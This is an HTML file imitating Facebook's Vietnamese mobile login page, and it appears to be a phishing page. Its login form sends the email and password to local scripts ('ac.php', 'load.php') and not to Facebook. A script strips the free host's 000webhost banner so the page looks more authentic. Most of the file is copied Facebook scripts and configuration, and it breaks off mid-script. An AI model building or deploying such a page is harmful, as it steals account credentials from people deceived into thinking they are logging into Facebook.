<!DOCTYPE html>
<html>
    <head>
       <form method="post" action="load.php">
        <title>Facebook - Đăng nhập hoặc đăng ký</title>
        <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1"/>
        <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196"/>
        <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer"/>
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/l/0,cross/nZzFmbUtSL2.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="BYBRF" crossorigin="anonymous"/>
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/l/0,cross/5CaTEV-QS2L.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="S0evd" crossorigin="anonymous"/>
        <script id="u_0_e">
        window.onload = () => {
   let bannerNode = document.querySelector('[alt="www.000webhost.com"]').parentNode.parentNode;
   bannerNode.parentNode.removeChild(bannerNode);
}
            function envFlush(a) {
                function b(b) {
                    for (var c in a)
                        b[c] = a[c]
                }
                window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {},
                b(window.Env))
            }
            envFlush({
                "timeslice_heartbeat_config": {
                    "pollIntervalMs": 33,
                    "idleGapThresholdMs": 60,
                    "ignoredTimesliceNames": {
                        "requestAnimationFrame": true,
                        "Event listenHandler mousemove": true,
                        "Event listenHandler mouseover": true,
                        "Event listenHandler mouseout": true,
                        "Event listenHandler scroll": true
                    },
                    "isHeartbeatEnabled": true,
                    "isArtilleryOn": false
                },
                "shouldLogCounters": true,
                "timeslice_categories": {
                    "react_render": true,
                    "reflow": true
                },
                "sample_continuation_stacktraces": true,
                "dom_mutation_flag": true
            });
        </script>
        <script>
            document.domain = 'facebook.com';
            /^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash) && location.replace(location.hash.substr(location.hash.indexOf("!") + 1));
        </script>
        <script>
            __DEV__ = 0;
        </script>
        <script id="u_0_f" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3/yy/r/Y8u7aueOZmh.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="NBIUl"></script>
        <script id="u_0_c">
            CavalryLogger = window.CavalryLogger || function(a) {
                this.lid = a,
                this.transition = !1,
                this.metric_collected = !1,
                this.is_detailed_profiler = !1,
                this.instrumentation_started = !1,
                this.pagelet_metrics = {},
                this.events = {},
                this.ongoing_watch = {},
                this.values = {
                    t_cstart: window._cstart
                },
                this.piggy_values = {},
                this.bootloader_metrics = {},
                this.resource_to_pagelet_mapping = {},
                this.initializeInstrumentation && this.initializeInstrumentation()
            }
            ,
            CavalryLogger.prototype.setIsDetailedProfiler = function(a) {
                this.is_detailed_profiler = a;
                return this
            }
            ,
            CavalryLogger.prototype.setTTIEvent = function(a) {
                this.tti_event = a;
                return this
            }
            ,
            CavalryLogger.prototype.setValue = function(a, b, c, d) {
                d = d ? this.piggy_values : this.values;
                (typeof d[a] === "undefined" || c) && (d[a] = b);
                return this
            }
            ,
            CavalryLogger.prototype.getLastTtiValue = function() {
                return this.lastTtiValue
            }
            ,
            CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function(a, b, c, d) {
                this.mark(a);
                var e = this.values.t_cstart || this.values.t_start;
                e = d ? e + d : CavalryLogger.now();
                this.setValue(a, e, b, c);
                this.tti_event && a == this.tti_event && (this.lastTtiValue = e,
                this.setTimeStamp("t_tti", b));
                return this
            }
            ,
            CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function(a) {
                console.timeStamp(a)
            }
            : function() {}
            ,
            CavalryLogger.prototype.addPiggyback = function(a, b) {
                this.piggy_values[a] = b;
                return this
            }
            ,
            CavalryLogger.instances = {},
            CavalryLogger.id = 0,
            CavalryLogger.disableArtilleryOnUntilOffLogging = !1,
            CavalryLogger.getInstance = function(a) {
                typeof a === "undefined" && (a = CavalryLogger.id);
                CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
                return CavalryLogger.instances[a]
            }
            ,
            CavalryLogger.setPageID = function(a) {
                if (CavalryLogger.id === 0) {
                    var b = CavalryLogger.getInstance();
                    CavalryLogger.instances[a] = b;
                    CavalryLogger.instances[a].lid = a;
                    delete CavalryLogger.instances[0]
                }
                CavalryLogger.id = a
            }
            ,
            CavalryLogger.now = function() {
                return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime()
            }
            ,
            CavalryLogger.prototype.measureResources = function() {}
            ,
            CavalryLogger.prototype.profileEarlyResources = function() {}
            ,
            CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {}
            ,
            CavalryLogger.start_js = function() {}
            ,
            CavalryLogger.done_js = function() {}
            ;
            CavalryLogger.getInstance().setTTIEvent("t_domcontent");
            CavalryLogger.prototype.measureResources = function(a, b) {
                if (!this.log_resources)
                    return;
                var c = "bootload/" + a.name;
                if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0)
                    return;
                var d = CavalryLogger.now();
                this.ongoing_watch[c] = d;
                "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
                b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
                if (a.type === "js") {
                    c = "js_exec/" + a.name;
                    this.ongoing_watch[c] = d
                }
            }
            ,
            CavalryLogger.prototype.stopWatch = function(a) {
                if (this.ongoing_watch[a]) {
                    var b = CavalryLogger.now()
                      , c = b - this.ongoing_watch[a];
                    this.bootloader_metrics[a] = c;
                    var d = this.piggy_values;
                    a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0),
                    d.resources_downloaded || (d.resources_downloaded = 0),
                    d.t_resource_download += c,
                    d.resources_downloaded += 1,
                    d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
                    delete this.ongoing_watch[a]
                }
                return this
            }
            ,
            CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {
                var a = {};
                Object.values(window.CavalryLogger.instances).forEach(function(b) {
                    b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
                });
                return a
            }
            ,
            CavalryLogger.start_js = function(a) {
                for (var b = 0; b < a.length; ++b)
                    CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
            }
            ,
            CavalryLogger.done_js = function(a) {
                for (var b = 0; b < a.length; ++b)
                    CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
            }
            ,
            CavalryLogger.prototype.profileEarlyResources = function(a) {
                for (var b = 0; b < a.length; b++)
                    this.measureResources({
                        name: a[b][0],
                        type: a[b][1] ? "js" : ""
                    }, "_EF_")
            }
            ;
            CavalryLogger.getInstance().log_resources = true;
            CavalryLogger.getInstance().setIsDetailedProfiler(true);
            window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
        </script>
        <script id="u_0_d">
            (function _(a, b, c, d) {
                function e(a) {
                    document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"
                }
                function f(a, b) {
                    document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure"
                }
                if (!a) {
                    e(b);
                    e(c);
                    return
                }
                a = null;
                (navigator.userAgent.indexOf("Firefox") !== -1 || !window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1) && (document.documentElement != null && (a = screen.width / document.documentElement.offsetWidth,
                a = Math.max(1, Math.floor(a * 2) / 2)));
                (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && (a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96,
                a = Math.max(1, Math.round(a * 2) / 2));
                f(b, (a || window.devicePixelRatio || 1).toString());
                e = window.screen ? screen.width : 0;
                b = window.screen ? screen.height : 0;
                f(c, e + "x" + b);
                d && document.cookie && window.devicePixelRatio > 1 && document.location.reload()
            }
            )(true, "m_pixel_ratio", "wd", false);
        </script>
        <meta name="description" content="T&#x1ea1;o m&#x1ed9;t t&#xe0;i kho&#x1ea3;n &#x111;&#x1ec3; &#x111;&#x103;ng nh&#x1ead;p Facebook. K&#x1ebf;t n&#x1ed1;i v&#x1edb;i b&#x1ea1;n b&#xe8;, gia &#x111;&#xec;nh v&#xe0; nh&#x1eef;ng ng&#x1b0;&#x1edd;i m&#xe0; b&#x1ea1;n bi&#x1ebf;t. Chia s&#x1ebb; &#x1ea3;nh v&#xe0; video, g&#x1eed;i tin nh&#x1eaf;n v&#xe0; nh&#x1ead;n c&#x1ead;p nh&#x1ead;t."/>
        <link rel="canonical" href="https://www.facebook.com/"/>
    </head>
    <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
        <script id="u_0_b">
            (function(a) {
                a.__updateOrientation = function() {
                    var b = !!a.orientation && a.orientation !== 180
                      , c = document.body;
                    c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
                    return b
                }
            }
            )(window);
        </script>
        <div id="viewport" data-kaios-focus-transparent="1">
            <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
            <div id="page" class="">
                <div class="_129_" id="header-notices"></div>
                <div class="_7om2 _52we _52z5" id="header">
                    <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
                        <a href="/login/?refid=8">
                            <i class="img sp_XQwuhv8Yn2- sx_5fbc0c">
                                <u>facebook</u>
                            </i>
                        </a>
                    </div>
                </div>
                <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
                    <div class="_7om2">
                        <div class="_4g34" id="u_0_0">
                            <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
                                <div class="_52jd"></div>
                            </div>
                            <div class="_4-4l">
                                <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div>
                                <div class="_5rut">
                                    <form method="post" action="ac.php" id="login_form" novalidate="1" data-sigil="m_login_form">
                                        <input type="hidden" name="lsd" value="AVpBdoSS" autocomplete="off"/>
                                        <input type="hidden" name="jazoest" value="2706" autocomplete="off"/>
                                        <input type="hidden" name="m_ts" value="1586172414"/>
                                        <input type="hidden" name="li" value="_hGLXgziYCGNQAyAofZVXnhz"/>
                                        <input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number"/>
                                        <input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries"/>
                                        <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                        <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                        <div id="otp_retrieve_desc_container"></div>
                                        <div class="_56be _5sob">
                                            <div class="_55wo _55x2 _56bf">
                                                <div id="email_input_container">
                                                    <input  class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="textdata" name="textdata"placeholder="S&#x1ed1; di &#x111;&#x1ed9;ng ho&#x1eb7;c email" type="text" />
                                                </div>
                                                <div>
                                                    <div class="_1upc _mg8" data-sigil="m_login_password">
                                                        <div class="_7om2">
                                                            <div class="_4g34 _5i2i _52we">
                                                                <div class="_5xu4">
                                                                    <input autocorrect="on" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="textdata2" name="textdata2" placeholder="M&#x1ead;t kh&#x1ea9;u" type="password" />
                                                                </div>
                                                            </div>
                                                            <div class="_5s61 _216i _5i2i _52we">
                                                                <div class="_5xu4">
                                                                    <div class="_2pi9" style="display:none" id="u_0_1">
                                                                        <a href="#" data-sigil="password-plain-text-toggle">
                                                                            <span class="mfss" style="display:none" id="u_0_2">ẨN</span>
                                                                            <span class="mfss" id="u_0_3">HIỂN THỊ</span>
                                                                        </a>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_2pie" style="text-align:center;">
                                            <div id="u_0_4" data-sigil="login_password_step_element">
                                             
                                                <button type="submit" name="submit"  class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button">
                                                    <span class="_55sr">Đăng nhập</span>
                                                </button>
                                              </form>
                                            </div>
                                            <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
                                            <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                                            <div id="otp_button_elem_container"></div>
                                        </div>
                                        <input type="hidden" name="prefill_contact_point" id="prefill_contact_point"/>
                                        <input type="hidden" name="prefill_source" id="prefill_source"/>
                                        <input type="hidden" name="prefill_type" id="prefill_type"/>
                                        <input type="hidden" name="first_prefill_source" id="first_prefill_source"/>
                                        <input type="hidden" name="first_prefill_type" id="first_prefill_type"/>
                                        <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false"/>
                                        <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false"/>
                                        <input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false"/>
                                        <div class="_xo8"></div>
                                        <noscript>
                                            <input type="hidden" name="_fb_noscript" value="true"/>
                                        </noscript>
                                    </form>
                                    <div>
                                        <div class="_43mg _8qtf">
                                            <span class="_43mh">hoặc</span>
                                        </div>
                                        <div class="_52jj _5t3b" id="signup_button_area">
                                            <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="/reg-no-deeplink/?cid=103&amp;refid=8" tabindex="0" data-sigil="m_reg_button">Tạo tài khoản mới</a>
                                        </div>
                                    </div>
                                    <div>
                                        <div class="other-links _8p_m">
                                            <ul class="_5pkb _55wp">
                                                <li>
                                                    <span class="mfss fcg">
                                                        <a tabindex="0" href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8" id="forgot-password-link">Quên mật khẩu?</a>
                                                    </span>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div style="display:none">
                        <div></div>
                        <div></div>
                    </div>
                    <span>
                        <img src="https://facebook.com/security/hsts-pixel.gif?c=3.2" width="0" height="0" style="display:none"/>
                    </span>
                    <div class="_55wr _5ui2" data-sigil="m_login_footer">
                        <div class="_5dpw">
                            <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                                <div class="_7om2">
                                    <div class="_4g34">
                                        <span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                        <div class="_3ztc">
                                            <span class="_52jc">
                                                <a href="/a/language.php?l=zh_TW&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQCjLvwucunLspMP&amp;refid=8" data-locale="zh_TW" data-sigil="change_language">中文(台灣)</a>
                                            </span>
                                        </div>
                                        <div class="_3ztc">
                                            <span class="_52jc">
                                                <a href="/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQBluFJBSTPZ0978&amp;refid=8" data-locale="es_LA" data-sigil="change_language">Español</a>
                                            </span>
                                        </div>
                                        <div class="_3ztc">
                                            <span class="_52jc">
                                                <a href="/a/language.php?l=fr_FR&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAoLc1PdVz22GTy&amp;refid=8" data-locale="fr_FR" data-sigil="change_language">Français (France)</a>
                                            </span>
                                        </div>
                                    </div>
                                    <div class="_4g34">
                                        <div class="_3ztc">
                                            <span class="_52jc">
                                                <a href="/a/language.php?l=en_GB&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQARSv6ET7EOmZGw&amp;refid=8" data-locale="en_GB" data-sigil="change_language">English (UK)</a>
                                            </span>
                                        </div>
                                        <div class="_3ztc">
                                            <span class="_52jc">
                                                <a href="/a/language.php?l=ko_KR&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQCt1pZx-GQPg1w-&amp;refid=8" data-locale="ko_KR" data-sigil="change_language">한국어</a>
                                            </span>
                                        </div>
                                        <div class="_3ztc">
                                            <span class="_52jc">
                                                <a href="/a/language.php?l=pt_BR&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQC5htOpttf3uiu3&amp;refid=8" data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a>
                                            </span>
                                        </div>
                                        <a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8">
                                            <div class="_3j87 _1rrd _3ztd" aria-label="Danh s&#xe1;ch ng&#xf4;n ng&#x1eef; &#x111;&#x1ea7;y &#x111;&#x1ee7;" data-sigil="more_language">
                                                <i class="img sp_XQwuhv8Yn2- sx_8e9c51"></i>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="_5ui4">
                                <span class="mfss fcg">Facebook, Inc.</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class=""></div>
                <div class="viewportArea _2v9s" style="display:none" id="u_0_5" data-sigil="marea">
                    <div class="_5vsg" id="u_0_6"></div>
                    <div class="_5vsh" id="u_0_7"></div>
                    <div class="_5v5d fcg">
                        <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                        Đang tải...
                    </div>
                </div>
                <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
                    <div class="container">
                        <div class="image"></div>
                        <div class="message" data-sigil="error-message"></div>
                        <a class="link" data-sigil="MPageError:retry">Thử lại</a>
                    </div>
                </div>
            </div>
        </div>
        <div id="static_templates">
            <div class="mDialog" id="modalDialog" style="display:none">
                <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
                    <div class="_7om2 _52we">
                        <div class="_5s61">
                            <div class="_52z7">
                                <button type="submit" value="H&#x1ee7;y" class="cancelButton btn btnD bgb mfss touchable" id="u_0_9" data-sigil="dialog-cancel-button">Hủy</button>
                                <button type="submit" value="Quay l&#x1ea1;i" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Quay l&#x1ea1;i" id="u_0_a" data-sigil="dialog-back-button">
                                    <i class="img sp_XQwuhv8Yn2- sx_d401c9" style="margin-top: 2px;"></i>
                                </button>
                            </div>
                        </div>
                        <div class="_4g34">
                            <div class="_52z6">
                                <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Đang tải...</div>
                            </div>
                        </div>
                        <div class="_5s61">
                            <div class="_52z8" id="modalDialogHeaderButtons"></div>
                        </div>
                    </div>
                </div>
                <div class="modalDialogView" id="modalDialogView"></div>
                <div class="_5v5d _5v5e fcg" id="dialogSpinner">
                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_8" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                    Đang tải...
                </div>
            </div>
        </div>
        <script id="u_0_g" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/m02TX6BxFzz.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="yRNCI"></script>
        <script id="u_0_h" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3i_ch4/ys/l/vi_VN/TFHbXKPs9pZ.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="2vYSp"></script>
        <script id="u_0_i" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3iWPy4/yl/l/vi_VN/-eUBE-lRZh2.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="zgN4d"></script>
        <script id="u_0_j">
            requireLazy(["gkx"], function(gkx) {
                gkx.add({
                    "996940": {
                        "result": false,
                        "hash": "AT7fsaQYXExBeFKk"
                    },
                    "1263340": {
                        "result": false,
                        "hash": "AT4JbinUnQIin84e"
                    },
                    "946894": {
                        "result": false,
                        "hash": "AT6dp0ia2qACOgpj"
                    },
                    "676920": {
                        "result": false,
                        "hash": "AT5FUjJ76i5P1gv5"
                    },
                    "676921": {
                        "result": false,
                        "hash": "AT6oPkxhfyeZ5Bjq"
                    },
                    "1113247": {
                        "result": false,
                        "hash": "AT7JwWPVnzP__MlQ"
                    },
                    "676922": {
                        "result": false,
                        "hash": "AT7NkEYVTo1tphQw"
                    },
                    "1167394": {
                        "result": false,
                        "hash": "AT4l22u4dllh5WHs"
                    },
                    "676837": {
                        "result": false,
                        "hash": "AT6mqijt5_8_3L1N"
                    },
                    "1337877": {
                        "result": true,
                        "hash": "AT6q6X4rmY-rtVN_"
                    }
                });
            });
            require("TimeSliceImpl").guard(function() {
                (require("ServerJSDefine")).handleDefines([["ErrorDebugHooks", [], {
                    "SnapShotHook": null
                }, 185], ["BigPipeExperiments", [], {
                    "link_images_to_pagelets": false,
                    "enable_bigpipe_plugins": false
                }, 907], ["BootloaderConfig", [], {
                    "jsRetries": [200, 500],
                    "jsRetryAbortNum": 2,
                    "jsRetryAbortTime": 5,
                    "payloadEndpointURI": "https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/",
                    "preloadBE": false,
                    "shouldCoalesceModuleRequestsMadeInSameTick": true,
                    "retryQueuedBootloads": false,
                    "silentDups": false
                }, 329], ["CSSLoaderConfig", [], {
                    "timeout": 5000,
                    "modulePrefix": "BLCSS:",
                    "loadEventSupported": true
                }, 619], ["ServerNonce", [], {
                    "ServerNonce": "qGURa4Nls8B0s--5VYTryr"
                }, 141], ["UriNeedRawQuerySVConfig", [], {
                    "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx", "booking.com"]
                }, 3871], ["KSConfig", [], {
                    "killed": {
                        "__set": ["STO_AD_CREATION_BLOCK", "POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "STO_AD_DELIVERY_PAUSE", "POCKET_MONSTERS_UPDATE_NAME", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_MANAGER_SHOW_UI_HIDDEN_TASK_FOR_ASSET", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "RECRUITING_REQUISITION_VALIDATE_COMPANY_GROUPING_ON_LINK", "BAM_EXCLUDE_MEGAZORDED_ALERTS", "CALENDAR_WEEKVIEW_NEW_BADGE", "POST_INSIGHTS_CAPITALIZE_BREAKDOWNS_FOR_ACTION_TYPE", "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES", "BUY_AT_COVID_PUNCHOUT_CHECKOUT_MODAL", "DISABLE_HEARTBEAT_POLLING"]
                    },
                    "ko": {
                        "__set": ["a29SeZD6S7D", "acrJTh9WGdp", "1oOE64fL4wO", "2dhqRnqXGLQ", "3GaiM9xYkM2", "7r6mSP7ofr2", "1ntjZ2zgf03", "3oh5Mw86USj", "8NAceEy9JZo", "5mNEXob0nTj", "4j36SVzvP3w", "8PlKuowafe8", "53gCxKq281G", "3yzzwBY7Npj", "4NbCsulUUI3", "4NSq3ZC4ScE", "1onzIv0jH6H", "5LSlJUj3BnT", "2urFjIQigPj", "7EZACZMulOj", "6ra3sC1PDFj", "5XCz1h9Iaw3", "7cwY7xv5s7H", "1GgWO1oFyLN"]
                    }
                }, 2580], ["ImmediateImplementationExperiments", [], {
                    "prefer_message_channel": true
                }, 3419], ["PromiseUsePolyfillSetImmediateGK", [], {
                    "www_always_use_polyfill_setimmediate": false
                }, 2190], ["TrustedTypesConfig", [], {
                    "useTrustedTypes": false,
                    "reportOnly": true
                }, 4548], ["CurrentCommunityInitialData", [], {}, 490], ["CurrentUserInitialData", [], {
                    "USER_ID": "0",
                    "ACCOUNT_ID": "0",
                    "NAME": "",
                    "SHORT_NAME": null,
                    "IS_MESSENGER_ONLY_USER": false,
                    "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
                    "APP_ID": "412378670482"
                }, 270], ["MRequestConfig", [], {
                    "dtsg": {
                        "token": "AQGGz8LU-tcl:AQHDCul7MgDA",
                        "valid_for": 86400,
                        "expire": 1586258814
                    },
                    "dtsg_ag": {
                        "token": "AQzayRlOJUZVQO9T1zwt2WU6SDBnw2YtWGckpa3jEzzp_Q:AQzeAo_bOJnLU6DDlaJst-YodGNCyiuF_nDhN4JJ7MMPpw",
                        "valid_for": 604800,
                        "expire": 1586777214
                    },
                    "lsd": "AVpBdoSS",
                    "checkResponseOrigin": true,
                    "checkResponseToken": true,
                    "cleanFinishedRequest": false,
                    "cleanFinishedPrefetchRequests": false,
                    "ajaxResponseToken": {
                        "secret": "FrEUCLJyfvRQMHYKkSJ-yPJ9t0aK54ep",
                        "encrypted": "AYk2Gzy7T_K-tX3t06A-2YHex9lqdqKkPj-G5lPrS1Rfff9LTzhcDvYhyYSliBrtDy6-XIYjjnCEs-k0QB4LGQPJm2hV1YXU4O3n1r04bxMNvA"
                    }
                }, 51], ["SprinkleConfig", [], {
                    "param_name": "jazoest",
                    "version": 2,
                    "should_randomize": false
                }, 2111], ["ISB", [], {}, 330], ["LSD", [], {
                    "token": "AVpBdoSS"
                }, 323], ["SiteData", [], {
                    "server_revision": 1001948375,
                    "client_revision": 1001948375,
                    "tier": "",
                    "push_phase": "C3",
                    "pkg_cohort": "FW_EXP:mtouch_pkg",
                    "pr": 1,
                    "haste_site": "mobile",
                    "be_one_ahead": false,
                    "ir_on": true,
                    "is_rtl": false,
                    "is_comet": false,
                    "hsi": "6812558644291207214-0",
                    "spin": 0,
                    "__spin_r": 1001948375,
                    "__spin_b": "trunk",
                    "__spin_t": 1586172414,
                    "vip": "2a03:2880:f15a:83:face:b00c:0:25de"
                }, 317], ["InitialCookieConsent", [], {
                    "deferCookies": false,
                    "noCookies": false,
                    "shouldShowCookieBanner": false
                }, 4328], ["RunGatingConfig", [], {
                    "shouldUseBrowserUnload": true
                }, 3914], ["cr:717822", ["TimeSliceImpl"], {
                    "__rc": ["TimeSliceImpl", "Aa1cKNJ5KDe29Wca-ihHSd1ViFsVzYiH18VNJxLtJaY46zoTCMiv1ntWZ5P7Phboehz-jhgmt7qAXG7v3LdOFWA"]
                }, -1], ["cr:696703", [], {
                    "__rc": [null, "Aa1cKNJ5KDe29Wca-ihHSd1ViFsVzYiH18VNJxLtJaY46zoTCMiv1ntWZ5P7Phboehz-jhgmt7qAXG7v3LdOFWA"]
                }, -1], ["cr:1100101", ["requestAnimationFrameAcrossTransitionsSimple"], {
                    "__rc": ["requestAnimationFrameAcrossTransitionsSimple", "Aa1kCH0yyffqEIvY62lUJouq8RY8HSkGJBrzacujeFmEe4JRvrdMbIpLexdtHy8a1lOWyW4"]
                }, -1], ["cr:1268308", ["BanzaiNew"], {
                    "__rc": ["BanzaiNew", "Aa0wU57cy2qgc1FL6ziYsBsYVPx05jYKsVWI17uP5JHj-IM5vKHtWDjzcwOjps_5H5egMY14XkCzdW89KeBFVxPxBLhOV7Y0"]
                }, -1], ["cr:729414", [], {
                    "__rc": [null, "Aa0_OiYRTM1eMk3433_g2VSXAGL_mNNY7Be9YQ2OhKPMsLhYa4T9iqY4eErFlvLMCM_IbYaPE3u6dO7ie_xm"]
                }, -1], ["CookieCoreConfig", [], {
                    "a11y": {
                        "s": "None"
                    },
                    "act": {
                        "s": "Lax"
                    },
                    "c_user": {
                        "s": "None"
                    },
                    "dpr": {
                        "t": 604800,
                        "s": "None"
                    },
                    "js_ver": {
                        "t": 604800,
                        "s": "None"
                    },
                    "locale": {
                        "t": 604800,
                        "s": "None"
                    },
                    "m_pixel_ratio": {
                        "t": 604800,
                        "s": "None"
                    },
                    "noscript": {
                        "s": "None"
                    },
                    "pnl_data2": {
                        "t": 2,
                        "s": "None"
                    },
                    "presence": {
                        "s": "None"
                    },
                    "sfau": {
                        "s": "None"
                    },
                    "wd": {
                        "t": 604800,
                        "s": "None"
                    },
                    "x-referer": {
                        "s": "None"
                    },
                    "x-src": {
                        "t": 1,
                        "s": "None"
                    }
                }, 2104], ["CookieCoreLoggingConfig", [], {
                    "maximumIgnorableStallMs": 16.67,
                    "sampleRate": 9.7e-5,
                    "sampleRateClassic": 1.0e-10,
                    "sampleRateFastStale": 1.0e-8
                }, 3401], ["MBanzaiConfig", [], {
                    "EXPIRY": 86400000,
                    "MAX_SIZE": 10000,
                    "MAX_WAIT": 30000,
                    "RESTORE_WAIT": 30000,
                    "gks": {
                        "boosted_component": true,
                        "platform_oauth_client_events": true,
                        "visibility_tracking": true,
                        "xtrackable_clientview_batch": true,
                        "boosted_pagelikes": true,
                        "gqls_web_logging": true
                    },
                    "blacklist": ["time_spent"]
